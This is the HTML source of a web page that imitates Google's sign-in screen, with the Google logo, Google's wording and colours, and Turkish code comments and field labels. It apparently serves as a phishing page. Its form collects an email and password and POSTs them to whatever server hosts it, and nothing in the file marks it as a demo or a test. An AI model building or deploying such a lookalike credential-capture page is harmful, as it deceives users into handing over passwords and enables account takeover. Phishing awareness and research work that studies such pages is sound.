<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Google Account Login</title>
  <style>
    /* Basit bir reset */
    * {
      margin: 0; 
      padding: 0; 
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      background: #fff;
      padding: 40px;
      width: 350px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
    }

    .login-container img {
      width: 120px;
      margin-bottom: 20px;
    }

    .login-container h1 {
      font-size: 1.5rem;
      margin-bottom: 10px;
      color: #202124;
    }

    .login-container p {
      font-size: 0.9rem;
      color: #5f6368;
      margin-bottom: 20px;
    }

    .form-group {
      text-align: left;
      margin-bottom: 15px;
    }

    .form-group label {
      display: block;
      margin-bottom: 6px;
      font-weight: 500;
      color: #3c4043;
    }

    .form-group input {
      width: 100%;
      padding: 10px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 0.9rem;
      outline: none;
    }

    .form-group input:focus {
      border-color: #4285f4;
    }

    button[type="submit"] {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border: none;
      outline: none;
      background-color: #1a73e8;
      color: white;
      font-size: 1rem;
      border-radius: 4px;
      cursor: pointer;
    }

    button[type="submit"]:hover {
      background-color: #1765cc;
    }

    .footer-text {
      margin-top: 20px;
      font-size: 0.8rem;
      color: #5f6368;
      line-height: 1.4;
    }

    .footer-text a {
      color: #1a73e8;
      text-decoration: none;
    }

    .footer-text a:hover {
      text-decoration: underline;
    }

  </style>
</head>
<body>
  <div class="login-container">
    <!-- Google logosu, Wikipedia üzerinden alınan bir SVG -->
    <img
      src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg"
      alt="Google Logo"
    />

    <h1>Sign in</h1>
    <p>to continue to Google</p>

    <form method="POST">
      <div class="form-group">
        <label for="username">Kullanıcı Adı (Email):</label>
        <input
          type="text"
          id="username"
          name="username"
          required
          autocomplete="off"
        />
      </div>

      <div class="form-group">
        <label for="password">Şifre:</label>
        <input
          type="password"
          id="password"
          name="password"
          required
          autocomplete="off"
        />
      </div>

      <button type="submit">Next</button>
    </form>

    <div class="footer-text">
      <p>
        Not your computer? Use a Private Window to sign in. 
        <a href="#">Learn more</a>
      </p>
    </div>
  </div>
</body>
</html>
